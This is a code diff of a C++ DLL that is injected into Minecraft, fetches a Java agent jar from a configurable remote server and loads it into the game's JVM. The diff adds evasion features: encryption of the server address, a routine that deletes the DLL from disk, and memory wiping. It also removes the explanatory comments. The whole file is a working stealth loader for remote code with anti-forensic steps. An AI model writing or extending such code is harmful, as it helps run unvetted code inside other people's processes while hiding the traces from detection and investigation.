@@ -1,45 +1,56 @@
 // language: C++20, target: Windows 11, MSVC or MinGW-w64
-// DLL entry point — injected into Minecraft via System Informer "Load module"
-// spawns worker thread → finds JVM → downloads agent → loads via JNI → self-unloads
 
 #include <windows.h>
 #include "jvm_bridge.h"
 #include "downloader.h"
+#include "crypt.h"
 
 static HMODULE g_self = nullptr;
 
+// self-delete: queues the DLL file for deletion on next reboot,
+// or deletes it immediately if no handle is open
+static void self_delete() {
+    wchar_t path[MAX_PATH]{};
+    if (GetModuleFileNameW(g_self, path, MAX_PATH) == 0) return;
+
+    // try immediate delete after FreeLibrary (file should be unlocked)
+    // MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT as fallback
+    if (!DeleteFileW(path)) {
+        MoveFileExW(path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
+    }
+}
+
 static DWORD WINAPI worker(LPVOID param) {
-    // small jitter before starting — don't spike immediately after inject
     Sleep(500 + (GetTickCount() % 300));
 
-    // download agent jar bytes from remote server
     std::vector<uint8_t> payload;
-    // ---- CONFIGURE THIS: your server URL ----
-    const wchar_t* host = L"127.0.0.1";
-    const wchar_t* path = L"/agent.jar";
+
+    // ---- CONFIGURE: your server ----
+    static constexpr auto enc_host = WENC(L"127.0.0.1");
+    static constexpr auto enc_path = WENC(L"/agent.jar");
+    auto host = WDEC(enc_host);
+    auto path = WDEC(enc_path);
     int port = 8443;
-    bool use_tls = true;
 
-    if (!download_payload(host, path, port, use_tls, payload) || payload.empty()) {
-        // silent fail — no traces
+    if (!download_payload(host, path, port, true, payload) || payload.empty()) {
+        self_delete();
         FreeLibraryAndExitThread(g_self, 0);
         return 0;
     }
 
-    // find JVM in this process and load the payload
     if (!jvm_load_agent(payload.data(), static_cast<int>(payload.size()))) {
-        // silent fail
+        SecureZeroMemory(payload.data(), payload.size());
+        self_delete();
         FreeLibraryAndExitThread(g_self, 0);
         return 0;
     }
 
-    // payload is running inside the JVM now — wipe our copy
     SecureZeroMemory(payload.data(), payload.size());
     payload.clear();
 
-    // unload this DLL from the process — leaves no native module behind
-    // small delay so the thread can finish cleanly
-    Sleep(100);
+    // delete the DLL file from disk, then unload from memory
+    self_delete();
+    Sleep(50);
     FreeLibraryAndExitThread(g_self, 0);
     return 0;
 }
